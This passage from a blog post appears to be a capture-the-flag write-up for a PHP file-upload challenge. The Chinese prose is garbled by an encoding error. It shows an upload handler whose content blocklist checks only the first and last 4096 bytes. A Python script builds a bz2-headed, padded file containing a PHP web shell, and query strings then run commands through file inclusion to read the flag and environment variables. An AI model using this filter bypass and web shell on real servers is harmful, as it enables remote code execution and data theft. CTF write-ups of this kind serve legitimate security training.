</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;No file.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $tmp <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
</span></span><span style="display:flex;"><span>    $orig <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_uploaded_file</span>($tmp)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Upload error.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">pathinfo</span>($orig, <span style="color:#a6e22e">PATHINFO_EXTENSION</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($ext, $allowed_extensions)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Bad extension.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $finfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">finfo_open</span>(<span style="color:#a6e22e">FILEINFO_MIME_TYPE</span>);
</span></span><span style="display:flex;"><span>    $mime <span style="color:#f92672">=</span> <span style="color:#a6e22e">finfo_file</span>($finfo, $tmp);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">finfo_close</span>($finfo);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($mime, $allowed_mime_types)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Bad mime.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">content_filter</span>($tmp, $BLOCK_LIST)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Content blocked.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $newname <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^A-Za-z0-9._-]/&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>, $orig);
</span></span><span style="display:flex;"><span>    $dest <span style="color:#f92672">=</span> $SANDBOX <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $newname;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">move_uploaded_file</span>($tmp, $dest)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">500</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Move failed.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;UPLOAD_OK:&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($newname, <span style="color:#a6e22e">ENT_QUOTES</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>å¯¹æ–‡ä»¶åç¼€åè¿›è¡Œç™½åå•æ£€æµ‹</li>
<li>å¯¹æ–‡ä»¶å†…å®¹å‰åé¦–å°¾ä¸¤ç«¯å„ 4096 å­—èŠ‚å†…å®¹è¿›è¡Œé»‘åå•æ£€æŸ¥</li>
<li>åç«¯ç”¨<code>finfo_file()</code>æ£€æµ‹æ–‡ä»¶å®é™… MIME ç±»å‹è¿›è¡Œç™½åå•æ£€æŸ¥ï¼Œé˜²æ­¢æŠ“åŒ…ä¿®æ”¹</li>
</ul>
<p><strong>åªè¦åœ¨ä¸Šä¼ çš„æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªåˆæ³•çš„ bz2 æ–‡ä»¶å¤´éƒ¨æ ‡è¯†ï¼ˆé­”æœ¯å­—èŠ‚ BZhï¼‰ï¼Œåœ¨å†…å®¹ä¸­é—´è¿›è¡Œ PHP ä»£ç æ³¨å…¥ï¼Œæœ€åå°†ä¸¤ç«¯è¿›è¡Œå­—èŠ‚å¡«å……å³å¯æ„é€ å‡ºæ”»å‡»æ–‡ä»¶ï¼Œåç¼€ä¸º bz2</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e"># æ”»å‡»æ–‡ä»¶æ„é€ ä»£ç </span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># bz2 æ–‡ä»¶å¤´éƒ¨æ ‡è¯†</span>
</span></span><span style="display:flex;"><span>MAGIC <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BZh&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prepad_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>   <span style="color:#75715e"># æ”¾åœ¨ payload ä¹‹å‰ï¼ˆ&gt;4096ï¼‰</span>
</span></span><span style="display:flex;"><span>postpad_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>  <span style="color:#75715e"># æ”¾åœ¨ payload ä¹‹åï¼ˆ&gt;4096ï¼‰</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prepad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> prepad_len
</span></span><span style="display:flex;"><span>postpad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> postpad_len
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exploit <span style="color:#f92672">=</span> MAGIC <span style="color:#f92672">+</span> prepad <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postpad <span style="color:#75715e"># æœ€æ€»è¦å†™å…¥çš„å­—èŠ‚å†…å®¹</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;evil.bz2&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(exploit)
</span></span></code></pre></div><p><strong>å°†ç”Ÿæˆçš„ evil.bz2 æ–‡ä»¶åœ¨ /upload.php ä¸­ä¸Šä¼ ï¼Œåœ¨è®¿é—® /index.php é¡µé¢æ‰§è¡Œæ–‡ä»¶åŒ…å«è¿œç¨‹ rce å³å¯ï¼Œæœ€ç»ˆ  Payload å¦‚ä¸‹</strong></p>
<pre tabindex="0"><code class="language-Payload" data-lang="Payload">index.php?f=xxx.bz2&amp;cmd=cat /flag/flag.txt
index.php?f=xxx.bz2&amp;cmd=env | grep SYC
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://lhzzz08.github.io/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">æå®¢å¤§æŒ‘æˆ˜</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://lhzzz08.github.io/">Lhz&#39;s blog</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
